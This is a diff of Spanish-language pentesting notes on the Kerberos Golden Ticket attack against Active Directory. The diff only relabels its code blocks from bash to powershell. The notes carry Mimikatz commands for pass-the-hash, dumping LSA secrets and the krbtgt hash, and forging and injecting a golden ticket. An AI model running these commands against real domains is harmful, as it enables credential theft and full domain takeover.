@@ -4,7 +4,7 @@ Tags: #AD #Window #Powershell
 
 Es un ataque de ciberseguridad malicioso donde un atacante gana acceso ilimitado a un dominio de una organización, accesando a la data almacenada en AD. Explota una vulnerabilidad en el protocolo de autenticacion de Kerberos, donde es usado para acceder al AD, permitiendo al atacante un 'bypass' normal. 
 
-```bash 
+```powershell
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas 
  	
@@ -16,7 +16,7 @@ Es un ataque de ciberseguridad malicioso donde un atacante gana acceso ilimitado
 ❯ Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:<Domain> /ntlm:<NTLM-Hash> /run:powershell.exe"' 
 ```
 
-```bash 
+```powershell 
 # En la nueva consola que se abre con el comando anterior vamos a extraer hash de kerberos de las password de las cuentas
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas 
@@ -25,7 +25,7 @@ Es un ataque de ciberseguridad malicioso donde un atacante gana acceso ilimitado
 ❯  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DomainController> # Muestra info de los secretos de LSA y copiamos el NTLM de 'krbtgt'
 ```
 
-```bash 
+```powershell
 # Regresamos a la primer consola, generamos e inyectamos el 'Golden Ticket'
 ❯ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:12345 /krbtgt:<krbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'  # Generamos e inyectamos nuestro 'Golden Ticket' 
 
